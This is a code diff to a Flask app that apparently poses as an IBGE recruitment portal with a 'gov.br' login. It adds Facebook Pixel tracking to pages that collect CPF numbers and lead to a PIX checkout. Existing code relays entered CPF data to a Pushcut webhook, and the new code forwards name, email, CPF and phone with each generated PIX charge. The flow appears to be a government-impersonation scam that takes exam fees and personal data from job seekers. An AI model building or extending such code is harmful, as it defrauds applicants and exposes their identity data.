@@ -1,5 +1,6 @@
 from flask import render_template, request, jsonify, session, redirect
 from models import ConcursoPublico, ProcessoSeletivo, VagaEstagio, CookieConsent
+from facebook_pixel import facebook_pixel
 import requests
 import qrcode
 from io import BytesIO
@@ -15,6 +16,9 @@ def register_routes(app):
     @app.route('/')
     def index():
         """Página principal - Trabalhe Conosco IBGE"""
+        # Track page view
+        facebook_pixel.track_page_view("Homepage")
+        
         concursos = ConcursoPublico.query.filter_by(status='ativo').all()
         processos = ProcessoSeletivo.query.filter_by(status='ativo').all()
         estagios = VagaEstagio.query.filter_by(status='ativo').all()
@@ -45,6 +49,8 @@ def register_routes(app):
     @app.route('/login')
     def login():
         """Página de login gov.br"""
+        # Track registration start
+        facebook_pixel.track_page_view("Login Page")
         return render_template('login.html')
 
     def _send_pushcut_cpf_notification(cpf_data: dict, consultation_result: dict) -> None:
@@ -128,6 +134,9 @@ def register_routes(app):
             # Enviar notificação via Pushcut webhook
             _send_pushcut_cpf_notification(data, user_data)
             
+            # Track Facebook Pixel registration start event
+            facebook_pixel.track_registration_start(user_data)
+            
             session['user_data'] = user_data
             return jsonify({'success': True, 'data': user_data})
             
@@ -198,11 +207,16 @@ def register_routes(app):
     @app.route('/selecao-cargo')
     def selecao_cargo():
         """Página de seleção de cargo"""
+        # Track page view
+        facebook_pixel.track_page_view("Job Selection")
         return render_template('selecao_cargo.html')
 
     @app.route('/confirmacao-dados')
     def confirmacao_dados():
         """Página de confirmação de dados"""
+        
+        # Track page view
+        facebook_pixel.track_page_view("Data Confirmation")
         
         # Dados do usuário para o template
         usuario_data = session.get('user_data', {})
@@ -286,6 +300,8 @@ def register_routes(app):
     @app.route('/selecao-local-prova')
     def selecao_local_prova():
         """Página de seleção do local da prova"""
+        # Track page view
+        facebook_pixel.track_page_view("Exam Location Selection")
         # Carregar página imediatamente sem processamento lento
         return render_template('selecao_local_prova.html')
 
@@ -294,6 +310,8 @@ def register_routes(app):
     @app.route('/checkout')
     def checkout():
         """Página de checkout PIX"""
+        # Track page view
+        facebook_pixel.track_page_view("Checkout")
         return render_template('checkout.html')
 
     @app.route('/gerar-pix', methods=['POST'])
@@ -364,6 +382,15 @@ def register_routes(app):
                 
                 if result.get('success'):
                     print(f"[PIX DEBUG] ✓ PIX Cashtime gerado com sucesso: {result.get('cashtime_id')}")
+                    
+                    # Track Facebook Pixel PIX generation
+                    user_info = {
+                        'nome_completo': data['name'],
+                        'email': data['email'],
+                        'cpf': data['cpf'],
+                        'phone': data.get('phone', '')
+                    }
+                    facebook_pixel.track_pix_generation(user_info, result.get('cashtime_id'))
                     
                     # Registrar pedido no sistema de limite
                     try:
